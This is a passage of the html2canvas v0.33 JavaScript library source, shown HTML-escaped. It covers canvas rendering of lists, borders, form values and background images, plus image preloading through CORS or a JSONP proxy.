                    text = html2canvas.Generate.ListRoman( currentIndex );
                    break;
                case &#34;lower-roman&#34;:
                    text = html2canvas.Generate.ListRoman( currentIndex ).toLowerCase();
                    break;
                case &#34;lower-alpha&#34;:
                    text = html2canvas.Generate.ListAlpha( currentIndex ).toLowerCase();  
                    break;
                case &#34;upper-alpha&#34;:
                    text = html2canvas.Generate.ListAlpha( currentIndex );  
                    break;
            }

           
            text += &#34;. &#34;;
            listBounds = listPosition(element, text);
        
      
    
            switch(bold){
                case 401:
                    bold = &#34;bold&#34;;
                    break;
                case 400:
                    bold = &#34;normal&#34;;
                    break;
            }
    
 
       
        
            ctx.setVariable( &#34;fillStyle&#34;, getCSS(element, &#34;color&#34;) );
            ctx.setVariable( &#34;font&#34;, getCSS(element, &#34;fontVariant&#34;) + &#34; &#34; + bold + &#34; &#34; + getCSS(element, &#34;fontStyle&#34;) + &#34; &#34; + getCSS(element, &#34;fontSize&#34;) + &#34; &#34; + getCSS(element, &#34;fontFamily&#34;) );

        
            if ( position === &#34;inside&#34; ) {
                ctx.setVariable(&#34;textAlign&#34;, &#34;left&#34;);
                //   this.setFont(stack.ctx, element, false);     
                x = elBounds.left;
                
            }else{
                return; 
                /* 
                 TODO really need to figure out some more accurate way to try and find the position. 
                 as defined in http://www.w3.org/TR/CSS21/generate.html#propdef-list-style-position, it does not even have a specified &#34;correct&#34; position, so each browser 
                 may display it whatever way it feels like. 
                 &#34;The position of the list-item marker adjacent to floats is undefined in CSS 2.1. CSS 2.1 does not specify the precise location of the marker box or its position in the painting order&#34;
                */
                ctx.setVariable(&#34;textAlign&#34;, &#34;right&#34;);
                //  this.setFont(stack.ctx, element, true);
                x = elBounds.left - 10;
            }
        
            y = listBounds.bottom;
    
            drawText(text, x, y, ctx)
 
        
        }
 
    
    }
    
    function loadImage (src){
      var img = images[src];
      if (img &amp;&amp; img.succeeded === true) {
        return img.img;
      } else {
        return false;
      }
    }
    
    


 
    
    function clipBounds(src, dst){
 
        var x = Math.max(src.left, dst.left),
        y = Math.max(src.top, dst.top),
        x2 = Math.min((src.left + src.width), (dst.left + dst.width)),
        y2 = Math.min((src.top + src.height), (dst.top + dst.height));
 
        return {
            left:x,
            top:y,
            width:x2-x,
            height:y2-y
        };
 
    }
    
    function setZ(zIndex, parentZ){
        // TODO fix static elements overlapping relative/absolute elements under same stack, if they are defined after them
        
        if (!parentZ){
            this.zStack = h2czContext(0);
            return this.zStack;
        }
    
        if (zIndex !== &#34;auto&#34;){
            needReorder = true;
            var newContext = h2czContext(zIndex);
            parentZ.children.push(newContext);     
            return newContext;
        
        }
        
        return parentZ;
        
    }
    
    function renderBorders(el, ctx, bounds, clip){
     
        /*
         *  TODO add support for different border-style&#39;s than solid   
         */     
    
        var x = bounds.left,
        y = bounds.top,
        w = bounds.width,
        h = bounds.height,
        borderSide,
        borderData,
        bx,
        by,
        bw,
        bh,
        borderBounds,
        borders = (function(el){
            var borders = [],
            sides = [&#34;Top&#34;,&#34;Right&#34;,&#34;Bottom&#34;,&#34;Left&#34;],
            s;
        
            for (s = 0; s &lt; 4; s+=1){
                borders.push({
                    width: getCSSInt(el, &#39;border&#39; + sides[s] + &#39;Width&#39;),
                    color: getCSS(el, &#39;border&#39; + sides[s] + &#39;Color&#39;)
                });                      
            }
          
            return borders; 
            
        }(el));    
        

        for (borderSide = 0; borderSide &lt; 4; borderSide+=1){
            borderData = borders[borderSide];
                
            if (borderData.width&gt;0){
                bx = x;
                by = y;
                bw = w;
                bh = h - (borders[2].width);
                
                switch(borderSide){
                    case 0:
                        // top border
                        bh = borders[0].width;
                        break;
                    case 1:
                        // right border
                        bx = x + w - (borders[1].width);
                        bw = borders[1].width;                              
                        break;
                    case 2:
                        // bottom border
                        by = (by + h) - (borders[2].width);
                        bh = borders[2].width;
                        break;
                    case 3:
                        // left border
                        bw = borders[3].width;  
                        break;
                }		
                   
                borderBounds = {
                    left:bx,
                    top:by,
                    width: bw,
                    height:bh
                };
                   
                if (clip){
                    borderBounds = clipBounds(borderBounds, clip);
                }
                   
                   
                if (borderBounds.width&gt;0 &amp;&amp; borderBounds.height&gt;0){                           
                    renderRect(ctx, bx, by, borderBounds.width, borderBounds.height, borderData.color);
                }
                
          
            }
        }

        return borders;
    
    }
    
    
    function renderFormValue (el, bounds, stack){
    
        var valueWrap = doc.createElement(&#39;valuewrap&#39;),
        cssArr = [&#39;lineHeight&#39;,&#39;textAlign&#39;,&#39;fontFamily&#39;,&#39;color&#39;,&#39;fontSize&#39;,&#39;paddingLeft&#39;,&#39;paddingTop&#39;,&#39;width&#39;,&#39;height&#39;,&#39;border&#39;,&#39;borderLeftWidth&#39;,&#39;borderTopWidth&#39;],
        i,
        textValue,
        textNode,
        arrLen,
        style;
        
        for (i = 0, arrLen = cssArr.length; i &lt; arrLen; i+=1){
            style = cssArr[i];

            try {
            valueWrap.style[style] = getCSS(el, style);
            } catch( e ) {
                // Older IE has issues with &#34;border&#34;
                h2clog(&#34;html2canvas: Parse: Exception caught in renderFormValue: &#34; + e.message);
            }
        }
        
                
        valueWrap.style.borderColor = &#34;black&#34;;            
        valueWrap.style.borderStyle = &#34;solid&#34;;  
        valueWrap.style.display = &#34;block&#34;;
        valueWrap.style.position = &#34;absolute&#34;;
        if (/^(submit|reset|button|text|password)$/.test(el.type) || el.nodeName === &#34;SELECT&#34;){
            valueWrap.style.lineHeight = getCSS(el, &#34;height&#34;);
        }
  
                
        valueWrap.style.top = bounds.top + &#34;px&#34;;
        valueWrap.style.left = bounds.left + &#34;px&#34;;
        
        if (el.nodeName === &#34;SELECT&#34;){
            // TODO increase accuracy of text position
            textValue = el.options[el.selectedIndex].text;
        } else{   
            textValue = el.value;   
        }
        textNode = doc.createTextNode(textValue);
    
        valueWrap.appendChild(textNode);
        body.appendChild(valueWrap);
        
                
        renderText(el, textNode, stack);
        body.removeChild(valueWrap);        
  
   
    
    }
    

    
    function getBackgroundPosition(el, bounds, image){
        // TODO add support for multi image backgrounds
    
        var bgposition = (function( bgp ){   
            
            if (bgp !== undefined) {
                return (bgp.split(&#34;,&#34;)[0] || &#34;0 0&#34;).split(&#34; &#34;);
            } else {
               // Older IE uses -x and -y 
               return [ getCSS(el, &#34;backgroundPositionX&#34;), getCSS(el, &#34;backgroundPositionY&#34;) ];
            }
            
            
        })( getCSS(el, &#34;backgroundPosition&#34;) ),
        topPos,
        left,
        percentage,
        val;
    
        if (bgposition.length === 1){
            val = bgposition;
            
            bgposition = [];
        
            bgposition[0] = val;
            bgposition[1] = val;
        }  

    

        if (bgposition[0].toString().indexOf(&#34;%&#34;) !== -1){    
            percentage = (parseFloat(bgposition[0])/100);        
            left =  ((bounds.width * percentage)-(image.width*percentage));
      
        }else{
            left = parseInt(bgposition[0],10);
        }

        if (bgposition[1].toString().indexOf(&#34;%&#34;) !== -1){  

            percentage = (parseFloat(bgposition[1])/100);     
            topPos =  ((bounds.height * percentage)-(image.height*percentage));
        }else{      
            topPos = parseInt(bgposition[1],10);      
        }

    

           
        return {
            top: topPos,
            left: left
        };
         
    }
    
    function renderImage (ctx, image, sx, sy, sw, sh, dx, dy, dw, dh) {
        ctx.drawImage(
            image,
            sx, //sx
            sy, //sy
            sw, //sw
            sh, //sh
            dx, //dx
            dy, // dy
            dw, //dw
            dh //dh      
            );
        numDraws+=1; 
    
    }

            
    function renderBackgroundRepeat (ctx, image, x, y, width, height, elx, ely){
        var sourceX = 0,
        sourceY=0;
        if (elx-x&gt;0){
            sourceX = elx-x;
        }
        
        if (ely-y&gt;0){
            sourceY = ely-y;
        }

        renderImage(
            ctx,
            image,
            sourceX, // source X
            sourceY, // source Y 
            width-sourceX, // source Width
            height-sourceY, // source Height
            x+sourceX, // destination X
            y+sourceY, // destination Y
            width-sourceX, // destination width
            height-sourceY // destination height
            );
    }
    
    
    function renderBackgroundRepeatY (ctx, image, bgp, x, y, w, h){
        
        var height,
        width = Math.min(image.width,w),bgy;   
            
        bgp.top = bgp.top-Math.ceil(bgp.top/image.height)*image.height;                
        
        
        for(bgy=(y+bgp.top);bgy&lt;h+y;){   
            
         
            if ( Math.floor(bgy+image.height)&gt;h+y){
                height = (h+y)-bgy;
            }else{
                height = image.height;
            }
            renderBackgroundRepeat(ctx,image,x+bgp.left,bgy,width,height,x,y);   
      
            bgy = Math.floor(bgy+image.height); 
                              
        } 
    }
    
    function renderBackgroundRepeatX(ctx, image, bgp, x, y, w, h){
                           
        var height = Math.min(image.height,h),
        width,bgx;             
        
            
        bgp.left = bgp.left-Math.ceil(bgp.left/image.width)*image.width;                
        
        
        for (bgx=(x+bgp.left);bgx&lt;w+x;) {   

            if (Math.floor(bgx+image.width)&gt;w+x){
                width = (w+x)-bgx;
            }else{
                width = image.width;
            }
                
            renderBackgroundRepeat(ctx,image,bgx,(y+bgp.top),width,height,x,y);       
             
            bgx = Math.floor(bgx+image.width); 

                                
        } 
    }
    
    function renderBackground(el,bounds,ctx){
               
        // TODO add support for multi background-images
        var background_image = getCSS(el, &#34;backgroundImage&#34;),
        background_repeat = getCSS(el, &#34;backgroundRepeat&#34;).split(&#34;,&#34;)[0],
        image,
        bgp,
        bgy,
        bgw,
        bgsx,
        bgsy,
        bgdx,
        bgdy,
        bgh,
        h,
        height,
        add;
        
        //   if (typeof background_image !== &#34;undefined&#34; &amp;&amp; /^(1|none)$/.test(background_image) === false &amp;&amp; /^(-webkit|-moz|linear-gradient|-o-)/.test(background_image)===false){
      
        if ( !/data:image\/.*;base64,/i.test(background_image) &amp;&amp; !/^(-webkit|-moz|linear-gradient|-o-)/.test(background_image) ) {   
            background_image = background_image.split(&#34;,&#34;)[0];
        }
        
        if ( typeof background_image !== &#34;undefined&#34; &amp;&amp; /^(1|none)$/.test( background_image ) === false ) {
            background_image = html2canvas.Util.backgroundImage( background_image );
            image = loadImage( background_image );
					

            bgp = getBackgroundPosition(el, bounds, image);
            

            if ( image ){
                switch ( background_repeat ) {
					
                    case &#34;repeat-x&#34;:
                        renderBackgroundRepeatX( ctx, image, bgp, bounds.left, bounds.top, bounds.width, bounds.height );                     
                        break;
                         
                    case &#34;repeat-y&#34;:
                        renderBackgroundRepeatY( ctx, image, bgp, bounds.left, bounds.top, bounds.width, bounds.height );                                             
                        break;
                          
                    case &#34;no-repeat&#34;:
                        /*
                    this.drawBackgroundRepeat(
                        ctx,
                        image,
                        bgp.left+bounds.left, // sx
                        bgp.top+bounds.top, // sy
                        Math.min(bounds.width,image.width),
                        Math.min(bounds.height,image.height),
                        bounds.left,
                        bounds.top
                        );*/
                            
      
                        // console.log($(el).css(&#39;background-image&#39;));
                        bgw = bounds.width - bgp.left;
                        bgh = bounds.height - bgp.top;
                        bgsx = bgp.left;
                        bgsy = bgp.top;
                        bgdx = bgp.left+bounds.left;
                        bgdy = bgp.top+bounds.top;

                        //
                        //     bgw = Math.min(bgw,image.width);
                        //  bgh = Math.min(bgh,image.height);     
                    
                        if (bgsx&lt;0){
                            bgsx = Math.abs(bgsx);
                            bgdx += bgsx; 
                            bgw = Math.min(bounds.width,image.width-bgsx);
                        }else{
                            bgw = Math.min(bgw,image.width);
                            bgsx = 0;
                        }
                           
                        if (bgsy&lt;0){
                            bgsy = Math.abs(bgsy);
                            bgdy += bgsy; 
                            // bgh = bgh-bgsy;
                            bgh = Math.min(bounds.height,image.height-bgsy);
                        }else{
                            bgh = Math.min(bgh,image.height); 
                            bgsy = 0;
                        }    
    
                  
                        //   bgh = Math.abs(bgh);
                        //   bgw = Math.abs(bgw);
                        if (bgh&gt;0 &amp;&amp; bgw &gt; 0){        
                            renderImage(
                                ctx,
                                image,
                                bgsx, // source X : 0 
                                bgsy, // source Y : 1695
                                bgw, // source Width : 18
                                bgh, // source Height : 1677
                                bgdx, // destination X :906
                                bgdy, // destination Y : 1020
                                bgw, // destination width : 18
                                bgh // destination height : 1677
                                );
                            
                        // ctx.drawImage(image,(bounds.left+bgp.left),(bounds.top+bgp.top));	                      
                            
                        }
                        break;
                    default:
                        
                        
                              
                        bgp.top = bgp.top-Math.ceil(bgp.top/image.height)*image.height;                
                        
                        
                        for(bgy=(bounds.top+bgp.top);bgy&lt;bounds.height+bounds.top;){  
           
                        
           
                            h = Math.min(image.height,(bounds.height+bounds.top)-bgy);
                           
                            
                            if ( Math.floor(bgy+image.height)&gt;h+bgy){
                                height = (h+bgy)-bgy;
                            }else{
                                height = image.height;
                            }
                            // console.log(height);
                            
                            if (bgy&lt;bounds.top){
                                add = bounds.top-bgy;
                                bgy = bounds.top;
                                
                            }else{
                                add = 0;
                            }
                                              
                            renderBackgroundRepeatX(ctx,image,bgp,bounds.left,bgy,bounds.width,height);  
                            if (add&gt;0){
                                bgp.top += add;
                            }
                            bgy = Math.floor(bgy+image.height)-add; 
                        }
                        break;
                        
					
                }	
            }else{
                h2clog(&#34;html2canvas: Error loading background:&#34; + background_image);
            //console.log(images);
            }
					
        }
    }


 
    function renderElement(el, parentStack){
		
        var bounds = html2canvas.Util.Bounds(el), 
        x = bounds.left, 
        y = bounds.top, 
        w = bounds.width, 
        h = bounds.height, 
        image,
        bgcolor = getCSS(el, &#34;backgroundColor&#34;),
        cssPosition = getCSS(el, &#34;position&#34;),
        zindex,
        opacity = getCSS(el, &#34;opacity&#34;),
        stack,
        stackLength,
        borders,
        ctx,
        bgbounds,
        imgSrc,
        paddingLeft,
        paddingTop,
        paddingRight,
        paddingBottom;
        
        if (!parentStack){
            docDim = docSize();
            parentStack = {
                opacity: 1
            };
        }else{
            docDim = {};
        }
        

        //var zindex = this.formatZ(this.getCSS(el,&#34;zIndex&#34;),cssPosition,parentStack.zIndex,el.parentNode);
   
        zindex = setZ( getCSS( el, &#34;zIndex&#34;), parentStack.zIndex );
          


        stack = {
            ctx: h2cRenderContext( docDim.width || w , docDim.height || h ),
            zIndex: zindex,
            opacity: opacity * parentStack.opacity,
            cssPosition: cssPosition
        };
    
    
 
        // TODO correct overflow for absolute content residing under a static position
        
        if (parentStack.clip){
            stack.clip = html2canvas.Util.Extend( {}, parentStack.clip );
        //stack.clip = parentStack.clip;
        //   stack.clip.height = stack.clip.height - parentStack.borders[2].width;
        } 
 
 
        if ( options.useOverflow === true &amp;&amp; /(hidden|scroll|auto)/.test(getCSS(el, &#34;overflow&#34;)) === true &amp;&amp; /(BODY)/i.test(el.nodeName) === false ){
            if (stack.clip){
                stack.clip = clipBounds(stack.clip, bounds);
            }else{
                stack.clip = bounds;
            }
        }   


        stackLength =  zindex.children.push(stack);
        
        ctx = zindex.children[stackLength-1].ctx; 
    
        ctx.setVariable(&#34;globalAlpha&#34;, stack.opacity);  

        // draw element borders
        borders = renderBorders(el, ctx, bounds, false);
        stack.borders = borders;

    
        // let&#39;s modify clip area for child elements, so borders dont get overwritten
    
        /*
    if (stack.clip){
        stack.clip.width = stack.clip.width-(borders[1].width); 
        stack.clip.height = stack.clip.height-(borders[2].width); 
    }
     */
        if (ignoreElementsRegExp.test(el.nodeName) &amp;&amp; options.iframeDefault !== &#34;transparent&#34;){ 
            if (options.iframeDefault === &#34;default&#34;){
                bgcolor = &#34;#efefef&#34;;
            }else{
                bgcolor = options.iframeDefault;           
            }
        }
               
        // draw base element bgcolor   

        bgbounds = {
            left: x + borders[3].width,
            top: y + borders[0].width,
            width: w - (borders[1].width + borders[3].width),
            height: h - (borders[0].width + borders[2].width)
        };
        
        //if (this.withinBounds(stack.clip,bgbounds)){  
        
        if (stack.clip){
            bgbounds = clipBounds(bgbounds, stack.clip);
        
        //}    
    
        }
    

        if (bgbounds.height &gt; 0 &amp;&amp; bgbounds.width &gt; 0){
            renderRect(
                ctx,
                bgbounds.left,
                bgbounds.top,
                bgbounds.width,
                bgbounds.height,
                bgcolor
                );
           
            renderBackground(el, bgbounds, ctx);     
        }
        
        switch(el.nodeName){
            case &#34;IMG&#34;:
                imgSrc = el.getAttribute(&#39;src&#39;);
                image = loadImage(imgSrc);
                if (image){

                    paddingLeft = getCSSInt(el, &#39;paddingLeft&#39;);
                    paddingTop = getCSSInt(el, &#39;paddingTop&#39;);
                    paddingRight = getCSSInt(el, &#39;paddingRight&#39;);
                    paddingBottom = getCSSInt(el, &#39;paddingBottom&#39;);
                    
                    
                    renderImage(
                        ctx,
                        image,
                        0, //sx
                        0, //sy
                        image.width, //sw
                        image.height, //sh
                        x + paddingLeft + borders[3].width, //dx
                        y + paddingTop + borders[0].width, // dy
                        bounds.width - (borders[1].width + borders[3].width + paddingLeft + paddingRight), //dw
                        bounds.height - (borders[0].width + borders[2].width + paddingTop + paddingBottom) //dh       
                        );
           
                }else{
                    h2clog(&#34;html2canvas: Error loading &lt;img&gt;:&#34; + imgSrc);
                }
                break;
            case &#34;INPUT&#34;:
                // TODO add all relevant type&#39;s, i.e. HTML5 new stuff
                // todo add support for placeholder attribute for browsers which support it
                if (/^(text|url|email|submit|button|reset)$/.test(el.type) &amp;&amp; el.value.length &gt; 0){
                
                    renderFormValue(el, bounds, stack);
                

                /*
                 this just doesn&#39;t work well enough
                
                this.newText(el,{
                    nodeValue:el.value,
                    splitText: function(){
                        return this;
                    },
                    formValue:true
                },stack);
                 */
                }
                break;
            case &#34;TEXTAREA&#34;:
                if (el.value.length &gt; 0){
                    renderFormValue(el, bounds, stack);
                }
                break;
            case &#34;SELECT&#34;:
                if (el.options.length &gt; 0){
                    renderFormValue(el, bounds, stack);
                }
                break;
            case &#34;LI&#34;:
                renderListItem(el, stack, bgbounds);
                break;
            case &#34;CANVAS&#34;:
                paddingLeft = getCSSInt(el, &#39;paddingLeft&#39;);
                paddingTop = getCSSInt(el, &#39;paddingTop&#39;);
                paddingRight = getCSSInt(el, &#39;paddingRight&#39;);
                paddingBottom = getCSSInt(el, &#39;paddingBottom&#39;);
                renderImage(
                    ctx,
                    el,
                    0, //sx
                    0, //sy
                    el.width, //sw
                    el.height, //sh
                    x + paddingLeft + borders[3].width, //dx
                    y + paddingTop + borders[0].width, // dy
                    bounds.width - (borders[1].width + borders[3].width + paddingLeft + paddingRight), //dw
                    bounds.height - (borders[0].width + borders[2].width + paddingTop + paddingBottom) //dh
                );
                break;
        }

        return zindex.children[stackLength - 1];
    }
    
   
    
    function parseElement (el, stack) {
      
        // skip hidden elements and their children
        if (getCSS(el, &#39;display&#39;) !== &#34;none&#34; &amp;&amp; getCSS(el, &#39;visibility&#39;) !== &#34;hidden&#34;) { 
     
            stack = renderElement(el, stack) || stack;
          
            ctx = stack.ctx;
    
            if ( !ignoreElementsRegExp.test( el.nodeName ) ) {
                var elementChildren = html2canvas.Util.Children( el ),
                i,
                node,
                childrenLen;
                for (i = 0, childrenLen = elementChildren.length; i &lt; childrenLen; i+=1) {
                    node = elementChildren[i];
                    
                    if ( node.nodeType === 1 ) {
                        parseElement(node, stack);								
                    }else if ( node.nodeType === 3 ) {   
                        renderText(el, node, stack);
                    }      
                    
                }
               
            } 
        }
    }

    stack = renderElement(element, null);
    
    // parse every child element
    for (i = 0, children = element.children, childrenLen = children.length; i &lt; childrenLen; i+=1){      
        parseElement(children[i], stack);  
    }
    
    
    stack.backgroundColor = getCSS( body, &#34;backgroundColor&#34; );
    
    return stack;

};

function h2czContext(zindex) {
    return {
        zindex: zindex,
        children: []
    };  
};

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

html2canvas.Preload = function(element, opts){
    
    var options = {
        proxy: &#34;http://html2canvas.appspot.com/&#34;,
        timeout: 0,    // no timeout
        useCORS: false, // try to load images as CORS (where available), before falling back to proxy
        allowTaint: false // whether to allow images to taint the canvas, won&#39;t need proxy if set to true
    },
    images = {
        numLoaded: 0,   // also failed are counted here
        numFailed: 0,
        numTotal: 0,
        cleanupDone: false
    },
    pageOrigin,
    methods,
    i,
    count = 0,
    doc = element.ownerDocument,
    domImages = doc.images, // TODO probably should limit it to images present in the element only
    imgLen = domImages.length,
    link = doc.createElement(&#34;a&#34;),
    supportCORS = (function( img ){
        return (img.crossOrigin !== undefined);
    })(new Image()),
    timeoutTimer;

    link.href = window.location.href;
    pageOrigin  = link.protocol + link.host;
    opts = opts || {};
    
    options = html2canvas.Util.Extend(opts, options);
    
   
    
    element = element || doc.body;
    
    function isSameOrigin(url){
        link.href = url;  
        link.href = link.href; // YES, BELIEVE IT OR NOT, that is required for IE9 - http://jsfiddle.net/niklasvh/2e48b/
        var origin = link.protocol + link.host;              
        return (origin === pageOrigin);
    }
    
    function start(){
        h2clog(&#34;html2canvas: start: images: &#34; + images.numLoaded + &#34; / &#34; + images.numTotal + &#34; (failed: &#34; + images.numFailed + &#34;)&#34;);
        if (!images.firstRun &amp;&amp; images.numLoaded &gt;= images.numTotal){
        
            /*
            this.log(&#39;Finished loading &#39;+this.imagesLoaded+&#39; images, Started parsing&#39;);
            this.bodyOverflow = document.getElementsByTagName(&#39;body&#39;)[0].style.overflow;
            document.getElementsByTagName(&#39;body&#39;)[0].style.overflow = &#34;hidden&#34;;
            */
            if (typeof options.complete === &#34;function&#34;){
                options.complete(images);
            }

            h2clog(&#34;Finished loading images: # &#34; + images.numTotal + &#34; (failed: &#34; + images.numFailed + &#34;)&#34;);
        }
    }
    
    // TODO modify proxy to serve images with CORS enabled, where available
    function proxyGetImage(url, img, imageObj){
        var callback_name,
        scriptUrl = options.proxy,
        script;

        link.href = url;
        url = link.href; // work around for pages with base href=&#34;&#34; set - WARNING: this may change the url

        callback_name = &#39;html2canvas_&#39; + (count++);
        imageObj.callbackname = callback_name;
        
        if (scriptUrl.indexOf(&#34;?&#34;) &gt; -1) {
            scriptUrl += &#34;&amp;&#34;;
        } else {
            scriptUrl += &#34;?&#34;;
        }
        scriptUrl += &#39;url=&#39; + encodeURIComponent(url) + &#39;&amp;callback=&#39; + callback_name;
        script = doc.createElement(&#34;script&#34;);

        window[callback_name] = function(a){
            if (a.substring(0,6) === &#34;error:&#34;){
                imageObj.succeeded = false;
                images.numLoaded++;
                images.numFailed++;
                start();  
            } else {
                setImageLoadHandlers(img, imageObj);
                img.src = a; 
            }
            window[callback_name] = undefined; // to work with IE&lt;9  // NOTE: that the undefined callback property-name still exists on the window object (for IE&lt;9)
            try {
                delete window[callback_name];  // for all browser that support this
            } catch(ex) {}
            script.parentNode.removeChild(script);
            script = null;
            delete imageObj.script;
            delete imageObj.callbackname;
        };

        script.setAttribute(&#34;type&#34;, &#34;text/javascript&#34;);
        script.setAttribute(&#34;src&#34;, scriptUrl);
        imageObj.script = script;
        window.document.body.appendChild(script);

    }
    
    function getImages (el) {
        
     
    
        // if (!this.ignoreRe.test(el.nodeName)){
        // 

        var contents = html2canvas.Util.Children(el),
        i,
        contentsLen = contents.length,
        background_image,
        src,
        img,
        elNodeType = false;
        
        for (i = 0;  i &lt; contentsLen; i+=1 ){
            // var ignRe = new RegExp(&#34;(&#34;+this.ignoreElements+&#34;)&#34;);
            // if (!ignRe.test(element.nodeName)){
            getImages(contents[i]);
        // }
        }
            
        // }
        try {
            elNodeType = el.nodeType;
        } catch (ex) {
            elNodeType = false;
            h2clog(&#34;html2canvas: failed to access some element&#39;s nodeType - Exception: &#34; + ex.message);
        }

        if (elNodeType === 1 || elNodeType === undefined){
            
            // opera throws exception on external-content.html
            try {
                background_image = html2canvas.Util.getCSS(el, &#39;backgroundImage&#39;);
            }catch(e) {
                h2clog(&#34;html2canvas: failed to get background-image - Exception: &#34; + e.message);
            }
            if ( background_image &amp;&amp; background_image !== &#34;1&#34; &amp;&amp; background_image !== &#34;none&#34; ) {	
                
                // TODO add multi image background support
                
                if (background_image.substring(0,7) === &#34;-webkit&#34; || background_image.substring(0,3) === &#34;-o-&#34; || background_image.substring(0,4) === &#34;-moz&#34;) {
                  
                    img = html2canvas.Generate.Gradient( background_image, html2canvas.Util.Bounds( el ) );

                    if ( img !== undefined ){
                        images[background_image] = {
                            img: img, 
                            succeeded: true
                        };
                        images.numTotal++;
                        images.numLoaded++;
                        start();
                        
                    }
                    
                } else {	
                    src = html2canvas.Util.backgroundImage(background_image.match(/data:image\/.*;base64,/i) ? background_image : background_image.split(&#34;,&#34;)[0]);		
                    methods.loadImage(src); 		
                }
           
            /*
            if (background_image &amp;&amp; background_image !== &#34;1&#34; &amp;&amp; background_image !== &#34;none&#34; &amp;&amp; background_image.substring(0,7) !== &#34;-webkit&#34; &amp;&amp; background_image.substring(0,3)!== &#34;-o-&#34; &amp;&amp; background_image.substring(0,4) !== &#34;-moz&#34;){
                // TODO add multi image background support
                src = html2canvas.Util.backgroundImage(background_image.split(&#34;,&#34;)[0]);                    
                methods.loadImage(src);            */        
            }
        }
    }  
    
    function setImageLoadHandlers(img, imageObj) {
        img.onload = function() {
            if ( imageObj.timer !== undefined ) {
                // CORS succeeded
                window.clearTimeout( imageObj.timer );
            }
            images.numLoaded++;
            imageObj.succeeded = true;
            start();
        };
        img.onerror = function() {
            
            if (img.crossOrigin === &#34;anonymous&#34;) {
               // CORS failed
                window.clearTimeout( imageObj.timer );

                // let&#39;s try with proxy instead
                if ( options.proxy ) {
                    var src = img.src;
                    img = new Image();
                    imageObj.img = img;
                    img.src = src;

                    proxyGetImage( img.src, img, imageObj );
                    return;
                }
            }
            
            
            images.numLoaded++;
            images.numFailed++;
            imageObj.succeeded = false;
            start();
            
        };
    }
    
    // work around for https://bugs.webkit.org/show_bug.cgi?id=80028
    function isComplete() {
       if (!this.img.complete) { 
           this.timer = window.setTimeout(this.img.customComplete, 100) 
       } else { 
           this.img.onerror();         
       }
    }

    methods = {
        loadImage: function( src ) {
            var img, imageObj;      
            if ( src &amp;&amp; images[src] === undefined ) {
                img = new Image();                
                if ( src.match(/data:image\/.*;base64,/i) ) {
                    img.src = src.replace(/url\([&#39;&#34;]{0,}|[&#39;&#34;]{0,}\)$/ig, &#39;&#39;);
                    imageObj = images[src] = { img: img };
                    images.numTotal++;
                    setImageLoadHandlers(img, imageObj);
                } else if ( isSameOrigin( src ) || options.allowTaint ===  true ) {                    
                    imageObj = images[src] = { img: img };
                    images.numTotal++;
                    setImageLoadHandlers(img, imageObj);
                    img.src = src;
                } else if ( supportCORS &amp;&amp; !options.allowTaint &amp;&amp; options.useCORS ) {
                    // attempt to load with CORS
                    
                    img.crossOrigin = &#34;anonymous&#34;;    
                    imageObj = images[src] = { img: img };
                    images.numTotal++;
                    setImageLoadHandlers(img, imageObj);
                    img.src = src;             
                    
                    img.customComplete = isComplete.bind(imageObj);  
                    img.customComplete();
                    
                } else if ( options.proxy ) {
                    imageObj = images[src] = { img: img };
                    images.numTotal++;
                    proxyGetImage( src, img, imageObj );
                }
            }     
          
        },
        cleanupDOM: function(cause) {
            var img, src;
            if (!images.cleanupDone) {
                if (cause &amp;&amp; typeof cause === &#34;string&#34;) {
                    h2clog(&#34;html2canvas: Cleanup because: &#34; + cause);
                } else {
                    h2clog(&#34;html2canvas: Cleanup after timeout: &#34; + options.timeout + &#34; ms.&#34;);
                }

                for (src in images) {
                    if (images.hasOwnProperty(src)) {
                        img = images[src];
                        if (typeof img === &#34;object&#34; &amp;&amp; img.callbackname &amp;&amp; img.succeeded === undefined) {
                            // cancel proxy image request
                            window[img.callbackname] = undefined; // to work with IE&lt;9  // NOTE: that the undefined callback property-name still exists on the window object (for IE&lt;9)
                            try {
                                delete window[img.callbackname];  // for all browser that support this
                            } catch(ex) {}
                            if (img.script &amp;&amp; img.script.parentNode) {
                                img.script.setAttribute(&#34;src&#34;, &#34;about:blank&#34;);  // try to cancel running request
                                img.script.parentNode.removeChild(img.script);
                            }
                            images.numLoaded++;
                            images.numFailed++;
                            h2clog(&#34;html2canvas: Cleaned up failed img: &#39;&#34; + src + &#34;&#39; Steps: &#34; + images.numLoaded + &#34; / &#34; + images.numTotal);
                        }
                    }
                }

                // cancel any pending requests
                if(window.stop !== undefined) {
                    window.stop();
                } else if(document.execCommand !== undefined) {
                    document.execCommand(&#34;Stop&#34;, false);
                }
                if (document.close !== undefined) {
                    document.close();
                }
                images.cleanupDone = true;
                if (!(cause &amp;&amp; typeof cause === &#34;string&#34;)) {
                    start();
                }
            }
        },
        renderingDone: function() {
            if (timeoutTimer) {
                window.clearTimeout(timeoutTimer);
            }
        }
        
    };

    if (options.timeout &gt; 0) {
        timeoutTimer = window.setTimeout(methods.cleanupDOM, options.timeout);
    }
    h2clog(&#39;html2canvas: Preload starts: finding background-images&#39;);
    images.firstRun = true;

    getImages( element );
    
    h2clog(&#39;html2canvas: Preload: Finding images&#39;);
    // load &lt;img&gt; images
    for (i = 0; i &lt; imgLen; i+=1){
        methods.loadImage( domImages[i].getAttribute( &#34;src&#34; ) );
    }
    
    images.firstRun = false;
    h2clog(&#39;html2canvas: Preload: Done.&#39;);
    if ( images.numTotal === images.numLoaded ) {
        start();
    }  
    
    return methods;
    
};




/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/
function h2cRenderContext(width, height) {
    var storage = [];
    return {
        storage: storage,
        width: width,
        height: height,
        fillRect: function () {
            storage.push({
                type: &#34;function&#34;,
                name: &#34;fillRect&#34;,
                &#39;arguments&#39;: arguments
            });
        },
        drawImage: function () {
            storage.push({
                type: &#34;function&#34;,
                name: &#34;drawImage&#34;,
                &#39;arguments&#39;: arguments
            });
        },
        fillText: function () {
            storage.push({
                type: &#34;function&#34;,
                name: &#34;fillText&#34;,
                &#39;arguments&#39;: arguments
            });
        },
        setVariable: function (variable, value) {
            storage.push({
                type: &#34;variable&#34;,
                name: variable,
                &#39;arguments&#39;: value
            });
        }
    };
}

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
